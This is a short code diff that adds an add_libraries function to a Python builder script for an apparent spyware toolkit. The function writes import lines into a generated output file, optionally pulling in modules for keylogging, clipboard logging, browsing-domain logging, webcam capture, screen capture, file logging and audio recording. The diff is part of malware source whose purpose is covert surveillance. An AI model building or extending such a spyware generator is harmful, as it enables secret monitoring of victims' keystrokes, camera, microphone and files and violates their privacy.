@@ -141,5 +141,36 @@ def set_configs():
         record_time = {record_time}
         """
 
-def add_libraries():
-    pass
+
+def add_libraries(output_filename):
+    with open(output_filename, "w") as f:
+        f.write("import configparser\nfrom io import StringIO")
+
+    if include_KeyLogger:
+        with open(output_filename, "a") as f:
+            f.write("\nfrom SpyWare.KeyLogger import Daemon as keyDaemon, keyConfig")
+
+    if include_ClipboardLogger:
+        with open(output_filename, "a") as f:
+            f.write("\nfrom SpyWare.ClipboardLogger import Daemon as clipDaemon, clipboardConfig")
+
+    if include_DomainsLogger:
+        with open(output_filename, "a") as f:
+            f.write("\nfrom SpyWare.DomainsLogger import Daemon as domainDaemon, domainsConfig")
+
+    if include_WebcamSpy:
+        with open(output_filename, "a") as f:
+            f.write("\nfrom SpyWare.WebcamLogger import Daemon as camDaemon, webcamConfig")
+
+    if include_ScreenSpy:
+        with open(output_filename, "a") as f:
+            f.write("\nfrom SpyWare.ScreenLogger import Daemon as screenDaemon, screenConfig")
+
+    if include_FilesLogger:
+        with open(output_filename, "a") as f:
+            f.write("\nfrom SpyWare.FilesLogger import Daemon as filesDaemon, filesConfig")
+
+    if include_AudioRecorder:
+        with open(output_filename, "a") as f:
+            f.write("\nfrom SpyWare.AudioRecorder import Daemon as audioDaemon, audioConfig")
+
